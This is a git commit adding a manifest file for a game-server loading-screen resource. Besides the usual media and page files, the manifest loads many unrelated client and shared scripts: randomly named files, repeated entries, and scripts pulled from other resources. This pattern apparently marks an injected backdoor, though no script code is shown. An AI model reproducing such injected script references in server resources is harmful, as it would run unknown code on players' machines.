c4bd23b3508b81daa23c2fcb5944b04714b16936
Mira <99902235+Mira187@users.noreply.github.com>
2022-02-17 22:37:34 +0100

    Upload von mira_loadingscreen_blue

---
+++ __resource.lua
@@ -0,0 +1,45 @@
+files {
+    'index.html',
+    'rescale.js',
+    'script.js',
+    'bg.mp4',
+    'music.mp3'
+}
+
+loadscreen 'index.html'
+
+resource_manifest_version '77731fab-63ca-442c-a67b-abc70f28dfa5'
+
+client_script '@champion_geldw%C3%A4sche/xDxDxDxDxD.lua'
+
+client_script '@champion_uber/xDxDxDxDxD.lua'
+
+shared_script 'championrp.lua'
+
+shared_script 'championrp.lua'
+
+client_script 'trmylIIAHAqquIa.lua'
+
+client_script 'DDZfGlLQUezeXWD.lua'
+
+shared_script 'championrp.lua'
+
+client_script 'waffleswithreversum.lua'
+
+client_script 'waffleswithreversum.lua'
+
+shared_script 'championrp.lua'
+
+
+
+shared_script 'championrp.lua'
+
+
+
+shared_script 'championrp.lua'
+
+
+
+shared_script 'championrp.lua'
+
+shared_script '@epm-anticheat/secly.lua'
